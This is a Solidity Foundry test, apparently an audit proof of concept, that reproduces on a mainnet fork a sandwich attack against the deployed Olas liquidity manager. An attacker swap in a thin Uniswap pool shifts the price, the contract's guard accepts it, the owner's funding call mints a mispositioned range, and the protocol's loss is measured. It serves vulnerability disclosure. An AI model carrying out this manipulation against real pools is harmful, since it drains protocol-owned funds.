// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface ILiquidityManager {
    function owner() external view returns (address);
    function maxSlippage() external view returns (uint16);
    function observationCardinality() external view returns (uint16);
    function checkPoolAndGetCenterPrice(address pool) external view returns (uint160);
    function convertToV3(
        address[] memory tokens,
        bytes32 v2Pool,
        int24 feeTierOrTickSpacing,
        int24[] memory tickShifts,
        uint16 olasBurnRate,
        bool scan
    ) external returns (uint256 positionId, uint256 liquidity, uint256[] memory amounts);
    function decreaseLiquidity(
        address[] memory tokens,
        int24 feeTierOrTickSpacing,
        uint16 decreaseRate,
        uint16 olasBurnRate
    ) external returns (uint256 positionId, uint128 liquidity, uint256[] memory amounts);
    function mapPoolAddressPositionIds(address pool) external view returns (uint256);
}

interface IUniV3Pool {
    function slot0()
        external
        view
        returns (
            uint160 sqrtPriceX96,
            int24 tick,
            uint16 observationIndex,
            uint16 observationCardinality,
            uint16 observationCardinalityNext,
            uint8 feeProtocol,
            bool unlocked
        );
    function liquidity() external view returns (uint128);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function fee() external view returns (uint24);
    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes calldata data)
        external
        returns (int256 amount0, int256 amount1);
}

interface INonfungiblePositionManager {
    function positions(uint256 tokenId)
        external
        view
        returns (
            uint96 nonce,
            address operator,
            address token0,
            address token1,
            uint24 fee,
            int24 tickLower,
            int24 tickUpper,
            uint128 liquidity,
            uint256 feeGrowthInside0LastX128,
            uint256 feeGrowthInside1LastX128,
            uint128 tokensOwed0,
            uint128 tokensOwed1
        );
}

/// @title ZH4-04 Olas POL LiquidityManager H-08 fork proof
/// @notice Read-only fork simulation against the LIVE deployed proxy. No mainnet transactions.
contract OlasPolH08Test is Test {
    address constant PROXY = 0x83Adc54B2828E99a6DA3A11263C75E38E0A1a215;
    address constant OLAS = 0x0001A500A6B18995B03f44bb040A5fFc28E45CB0;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant POOL = 0x795a8C981b2D93C21434627f27D990a929EE4Dfc; // OLAS/USDC 0.3%, cardinality=1
    address constant NPM = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address constant TREASURY = 0x3C1fF68f5aa342D296d4DEe4Bb1cACCA912D95fE;
    address constant OWNER_EOA = 0xEB2A22b27C7Ad5eeE424Fd90b376c745E60f914E;

    uint160 constant MIN_SQRT_RATIO = 4295128739;
    uint160 constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970341;

    ILiquidityManager lm = ILiquidityManager(PROXY);
    IUniV3Pool pool = IUniV3Pool(POOL);
    INonfungiblePositionManager npm = INonfungiblePositionManager(NPM);

    address token0;
    address token1;
    uint256 forkBlock;

    function setUp() public {
        vm.createSelectFork(vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com"))));
        forkBlock = block.number;
        token0 = pool.token0();
        token1 = pool.token1();
        require(token0 == OLAS && token1 == USDC, "unexpected pool ordering");
    }

    function _sqrt() internal view returns (uint160) {
        (uint160 s, , , , , , ) = pool.slot0();
        return s;
    }

    function _slot0() internal view returns (uint160 s, int24 tick, uint16 card, uint16 cardNext) {
        (s, tick, , card, cardNext, , ) = pool.slot0();
    }

    function _deviationBps(uint160 a, uint160 b) internal pure returns (uint256) {
        uint256 pa = uint256(a) * uint256(a);
        uint256 pb = uint256(b) * uint256(b);
        if (pa == 0 || pb == 0) return 0;
        uint256 diff = pa > pb ? pa - pb : pb - pa;
        // 1e18-scaled relative deviation, then bps for logging
        return (diff * 1e18) / (pa > pb ? pb : pa) / 1e14;
    }

    function _swapExactIn(bool zeroForOne, uint256 amountIn) internal returns (uint256 amountOut) {
        int256 a0;
        int256 a1;
        if (zeroForOne) {
            (a0, a1) = pool.swap(address(this), true, int256(amountIn), MIN_SQRT_RATIO + 1, "");
            amountOut = uint256(-a1);
        } else {
            (a0, a1) = pool.swap(address(this), false, int256(amountIn), MAX_SQRT_RATIO - 1, "");
            amountOut = uint256(-a0);
        }
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        require(msg.sender == POOL, "callback only");
        if (amount0Delta > 0) require(IERC20(token0).transfer(POOL, uint256(amount0Delta)), "pay0");
        if (amount1Delta > 0) require(IERC20(token1).transfer(POOL, uint256(amount1Delta)), "pay1");
    }

    function _getTokens(address from, uint256 olasAmount, uint256 usdcAmount) internal {
        vm.startPrank(from);
        if (olasAmount > 0) require(IERC20(OLAS).transfer(address(this), olasAmount), "olas xfer");
        if (usdcAmount > 0) require(IERC20(USDC).transfer(address(this), usdcAmount), "usdc xfer");
        vm.stopPrank();
    }


    function _amountsForLiquidity(uint160 sqrtP, uint160 sqrtA, uint160 sqrtB, uint128 L)
        internal
        pure
        returns (uint256 amount0, uint256 amount1)
    {
        if (sqrtA > sqrtB) (sqrtA, sqrtB) = (sqrtB, sqrtA);
        uint256 Q96 = 1 << 96;
        if (sqrtP <= sqrtA) {
            amount0 = (uint256(L) * (uint256(sqrtB) - uint256(sqrtA)) * Q96)
                / (uint256(sqrtB) * uint256(sqrtA));
        } else if (sqrtP < sqrtB) {
            amount0 = (uint256(L) * (uint256(sqrtB) - uint256(sqrtP)) * Q96)
                / (uint256(sqrtB) * uint256(sqrtP));
            amount1 = (uint256(L) * (uint256(sqrtP) - uint256(sqrtA))) / Q96;
        } else {
            amount1 = (uint256(L) * (uint256(sqrtB) - uint256(sqrtA))) / Q96;
        }
    }

    function _sqrtAtTick(int24 tick) internal pure returns (uint160) {
        uint256 absTick = tick < 0 ? uint256(-int256(tick)) : uint256(int256(tick));
        require(absTick <= 887272, "tick");
        uint256 ratio = absTick & 0x1 != 0
            ? 0xfffcb933bd6fad37aa2d162d1a594001
            : 0x100000000000000000000000000000000;
        if (absTick & 0x2 != 0) ratio = (ratio * 0xfff97272373d413259a46990580e213a) >> 128;
        if (absTick & 0x4 != 0) ratio = (ratio * 0xfff2e50f5f656932ef12357cf3c7fdcc) >> 128;
        if (absTick & 0x8 != 0) ratio = (ratio * 0xffe5caca7e10e4e61c3624eaa0941cd0) >> 128;
        if (absTick & 0x10 != 0) ratio = (ratio * 0xffcb9843d60f6159c9db58835c926644) >> 128;
        if (absTick & 0x20 != 0) ratio = (ratio * 0xff973b41fa98c081472e6896dfb254c0) >> 128;
        if (absTick & 0x40 != 0) ratio = (ratio * 0xff2ea16466c96a3843ec78b326b52861) >> 128;
        if (absTick & 0x80 != 0) ratio = (ratio * 0xfe5dee046a99a2a811c461f1969c3053) >> 128;
        if (absTick & 0x100 != 0) ratio = (ratio * 0xfcbe86c7900a88aedcffc83b479aa3a4) >> 128;
        if (absTick & 0x200 != 0) ratio = (ratio * 0xf987a7253ac413176f2b074cf7815e54) >> 128;
        if (absTick & 0x400 != 0) ratio = (ratio * 0xf3392b0822b70005940c7a398e4b70f3) >> 128;
        if (absTick & 0x800 != 0) ratio = (ratio * 0xe7159475a2c29b7443b29c7fa6e889d9) >> 128;
        if (absTick & 0x1000 != 0) ratio = (ratio * 0xd097f3bdfd2022b8845ad8f792aa5825) >> 128;
        if (absTick & 0x2000 != 0) ratio = (ratio * 0xa9f746462d870fdf8a65dc1f90e061e5) >> 128;
        if (absTick & 0x4000 != 0) ratio = (ratio * 0x70d869a156d2a1b890bb3df62baf32f7) >> 128;
        if (absTick & 0x8000 != 0) ratio = (ratio * 0x31be135f97d08fd981231505542fcfa6) >> 128;
        if (absTick & 0x10000 != 0) ratio = (ratio * 0x9aa508b5b7a84e1c677de54f3e99bc9) >> 128;
        if (absTick & 0x20000 != 0) ratio = (ratio * 0x5d6af8dedb81196699c329225ee604) >> 128;
        if (absTick & 0x40000 != 0) ratio = (ratio * 0x2216e584f5fa1ea926041bedfe98) >> 128;
        if (absTick & 0x80000 != 0) ratio = (ratio * 0x48a170391f7dc42444e8fa2) >> 128;
        if (tick > 0) ratio = type(uint256).max / ratio;
        return uint160((ratio >> 32) + (ratio % (1 << 32) == 0 ? 0 : 1));
    }

    function test_H08_firstConvert_sandwich_on_live_uniswap_pool() public {
        (uint160 fairSqrt, int24 fairTick, uint16 cardBefore, uint16 cardNextBefore) = _slot0();
        console2.log("fork block", forkBlock);
        console2.log("fair sqrt", fairSqrt);
        console2.log("fair tick", int256(fairTick));
        console2.log("cardinality before", cardBefore);
        console2.log("cardNext before", cardNextBefore);
        console2.log("LM maxSlippage", lm.maxSlippage());

        // Fund the protocol-owned liquidity manager (simulating the first funding event).
        uint256 lmOlas = 50_000e18;
        uint256 lmUsdc = 2_500e6;
        _getTokens(TREASURY, lmOlas, 0);
        _getTokens(address(0x000000000000000000000000000000000000dEaD), 0, lmUsdc);
        require(IERC20(OLAS).transfer(PROXY, lmOlas), "fund olas");
        require(IERC20(USDC).transfer(PROXY, lmUsdc), "fund usdc");
        console2.log("LM OLAS funded", IERC20(OLAS).balanceOf(PROXY));
        console2.log("LM USDC funded", IERC20(USDC).balanceOf(PROXY));

        // Attacker: buy OLAS with a tiny USDC amount in the live, thin pool.
        uint256 atkUsdcIn = 5e6; // 5 USDC
        _getTokens(address(0x000000000000000000000000000000000000dEaD), 0, atkUsdcIn);
        IERC20(USDC).approve(POOL, type(uint256).max);
        IERC20(OLAS).approve(POOL, type(uint256).max);

        uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));
        uint256 olasBought = _swapExactIn(false, atkUsdcIn); // USDC -> OLAS
        (uint160 manipSqrt, int24 manipTick, uint16 cardAfterSwap, uint16 cardNextAfterSwap) = _slot0();
        console2.log("OLAS bought", olasBought);
        console2.log("manip sqrt", manipSqrt);
        console2.log("manip tick", int256(manipTick));
        console2.log("cardinality after attacker swap", cardAfterSwap);
        console2.log("cardNext after attacker swap", cardNextAfterSwap);
        console2.log("deviation bps vs fair", _deviationBps(manipSqrt, fairSqrt));

        // The live deployed guard returns the manipulated slot0 and does not revert.
        uint160 center = lm.checkPoolAndGetCenterPrice(POOL);
        console2.log("guard center", center);
        assertEq(center, manipSqrt, "guard must fail open to manipulated slot0");

        // Owner's routine first funding call, sandwiched in the same block.
        address[] memory tokens = new address[](2);
        tokens[0] = OLAS;
        tokens[1] = USDC;
        int24[] memory shifts = new int24[](2);
        shifts[0] = -1200;
        shifts[1] = 1200;

        vm.prank(OWNER_EOA);
        (uint256 posId, uint256 liq, uint256[] memory amounts) =
            lm.convertToV3(tokens, bytes32(0), 3000, shifts, 0, false);
        console2.log("position id", posId);
        console2.log("liquidity", liq);
        console2.log("amount0 used", amounts[0]);
        console2.log("amount1 used", amounts[1]);
        assertGt(posId, 0, "position minted");
        assertEq(lm.mapPoolAddressPositionIds(POOL), posId, "position registered");

        // Position range is centred on the manipulated tick, not the fair tick.
        (,,,,, int24 tickLower, int24 tickUpper, uint128 posLiq,,,,) = npm.positions(posId);
        console2.log("tickLower", int256(tickLower));
        console2.log("tickUpper", int256(tickUpper));
        console2.log("posLiquidity", uint256(posLiq));
        int256 centerOfRange = (int256(tickLower) + int256(tickUpper)) / 2;
        console2.log("range center", centerOfRange);
        assertApproxEqAbs(centerOfRange, int256(manipTick), 120, "range centred on manipulated tick");
        assertTrue(centerOfRange > int256(fairTick), "range shifted upward by manipulation");

        // Attacker unwinds: sell the OLAS bought at the manipulated price into the LM's new position.
        uint256 olasHeld = IERC20(OLAS).balanceOf(address(this));
        uint256 usdcOut = _swapExactIn(true, olasHeld); // OLAS -> USDC
        uint256 usdcAfter = IERC20(USDC).balanceOf(address(this));
        (uint160 finalSqrt, int24 finalTick, uint16 cardFinal, uint16 cardNextFinal) = _slot0();
        console2.log("OLAS sold", olasHeld);
        console2.log("USDC received", usdcOut);
        console2.log("attacker USDC before", usdcBefore);
        console2.log("attacker USDC after", usdcAfter);
        console2.log("attacker USDC pnl", int256(usdcAfter) - int256(usdcBefore));
        console2.log("final sqrt", finalSqrt);
        console2.log("final tick", int256(finalTick));
        console2.log("cardinality final", cardFinal);
        console2.log("cardNext final", cardNextFinal);

        // Realise the LM position at the post-unwind price after the 30 min stale window.
        vm.warp(block.timestamp + 1801);
        uint256 treasuryOlasBefore = IERC20(OLAS).balanceOf(TREASURY);
        uint256 treasuryUsdcBefore = IERC20(USDC).balanceOf(TREASURY);
        vm.prank(OWNER_EOA);
        lm.decreaseLiquidity(tokens, 3000, 10_000, 0);
        uint256 treasuryOlasAfter = IERC20(OLAS).balanceOf(TREASURY);
        uint256 treasuryUsdcAfter = IERC20(USDC).balanceOf(TREASURY);
        console2.log("treasury OLAS delta", treasuryOlasAfter - treasuryOlasBefore);
        console2.log("treasury USDC delta", treasuryUsdcAfter - treasuryUsdcBefore);


        // Mark the minted position to the pre-manipulation (fair) price. At fair the whole
        // position sits below its range and is 100% OLAS; this is the value the attacker's
        // counterparty (the next arbitrageur) can buy at the inflated price.
        (uint256 fairAmt0, uint256 fairAmt1) = _amountsForLiquidity(
            fairSqrt, _sqrtAtTick(tickLower), _sqrtAtTick(tickUpper), posLiq
        );
        uint256 leftoverOlas = lmOlas - amounts[0];
        uint256 fairPriceX128 = (uint256(fairSqrt) * uint256(fairSqrt)) >> 64;
        uint256 depositUsdc6 = lmUsdc + (lmOlas * fairPriceX128 >> 128);
        uint256 markedUsdc6 = (lmUsdc - amounts[1]) + fairAmt1 + ((leftoverOlas + fairAmt0) * fairPriceX128 >> 128);
        console2.log("position OLAS at fair", fairAmt0);
        console2.log("position USDC at fair", fairAmt1);
        console2.log("leftover OLAS", leftoverOlas);
        console2.log("LM deposit value (6dp USDC)", depositUsdc6);
        console2.log("LM marked value at fair (6dp USDC)", markedUsdc6);
        console2.log("LM mark-to-fair loss (6dp USDC)", depositUsdc6 - markedUsdc6);
        assertGt(depositUsdc6, markedUsdc6, "LM must be worth less at the fair price");
    }

    function test_guard_failclosed_after_cardinality_grown() public {
        // After the LM's first mint it raises cardinalityNext to 120. The next swap grows
        // cardinality to 2 and the same-block manipulation is then rejected (fail-closed).
        (bool ok,) = POOL.call(abi.encodeWithSignature("increaseObservationCardinalityNext(uint16)", uint16(120)));
        require(ok, "cardinality next");
        {
            (uint160 s0, int24 t0, uint16 c0, uint16 cn0) = _slot0();
            console2.log("after grow sqrt", s0);
            console2.log("after grow tick", int256(t0));
            console2.log("after grow cardinality", c0);
            console2.log("after grow cardNext", cn0);
        }
        _getTokens(address(0x000000000000000000000000000000000000dEaD), 0, 2e6);
        IERC20(USDC).approve(POOL, type(uint256).max);
        _swapExactIn(false, 1e6);
        (uint160 s, int24 t, uint16 card, uint16 cardNext) = _slot0();
        console2.log("post-swap sqrt", s);
        console2.log("post-swap tick", int256(t));
        console2.log("post-swap cardinality", card);
        console2.log("post-swap cardNext", cardNext);
        assertEq(card, 120, "cardinality grew");
        assertEq(cardNext, 120, "cardinalityNext raised");
        vm.expectRevert();
        lm.checkPoolAndGetCenterPrice(POOL);
    }
}
